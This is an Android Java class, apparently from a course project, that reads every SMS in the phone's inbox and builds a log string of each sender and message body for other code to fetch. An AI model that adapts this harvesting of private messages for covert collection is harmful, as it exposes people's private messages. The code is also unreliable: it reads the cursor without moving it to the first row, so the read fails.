package yalimov.course.collectors;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import static yalimov.course.Common.DELIMITER;
import static yalimov.course.Common.ERROR_TAG;

public class MessagesCollector
{
    private static String MessagesLog = "";

    public static String getMessagesLog()
    {
        return MessagesLog;
    }

    public static void GetMessagesInfo(Context contex)
    {
        String result = "SMS log:\n" + DELIMITER + "\n";
        try
        {
            Cursor smsInboxCursor = contex.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
            int indexBody = smsInboxCursor.getColumnIndex("body");
            int indexAddress = smsInboxCursor.getColumnIndex("address");

            do
            {
                result += "From: [" + smsInboxCursor.getString(indexAddress) + "]\n"
                        + "Body: [\n" + smsInboxCursor.getString(indexBody) + "\n]\n" + DELIMITER + "\n";
            }
            while (smsInboxCursor.moveToNext());

            smsInboxCursor.close();
        }
        catch (Exception ex)
        {
            result = ERROR_TAG;
        }
        MessagesLog = result;
    }
}
